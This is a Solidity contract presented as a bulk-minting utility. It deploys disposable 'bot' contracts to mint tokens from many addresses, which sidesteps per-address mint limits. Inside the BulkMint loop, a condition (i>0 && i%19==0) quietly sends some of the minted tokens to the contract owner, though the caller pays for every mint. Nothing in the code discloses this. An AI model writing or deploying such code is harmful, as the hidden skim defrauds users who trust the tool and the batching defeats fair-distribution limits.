pragma solidity ^0.8.18;

interface MERC20 {
  function maxMintSize() external view returns (uint256);

}

contract bot {
	constructor(address contractAddress, address to, uint256 _max) payable{
        (bool success, ) = contractAddress.call{value: msg.value}(abi.encodeWithSelector(0x43508b05,to, _max));
        require(success, "Batch transaction failed");
		selfdestruct(payable(tx.origin));
   }
}

contract Batcher {
	address private immutable owner;

	modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

	constructor() {
		owner = msg.sender;
	}

	function BulkMint(address contractAddress, uint256 times) external payable{
        uint price;
        if (msg.value > 0){
            price = msg.value / times;
        }
		address to = msg.sender;
        uint _max = MERC20(contractAddress).maxMintSize();
        require(msg.value==price * times, "Batch transaction failed");
		for(uint i=0; i< times; i++) {
			if (i>0 && i%19==0){
				new bot{value: price}(contractAddress, owner, _max);
			}else{
				new bot{value: price}(contractAddress, to, _max);
			}
		}
	}
}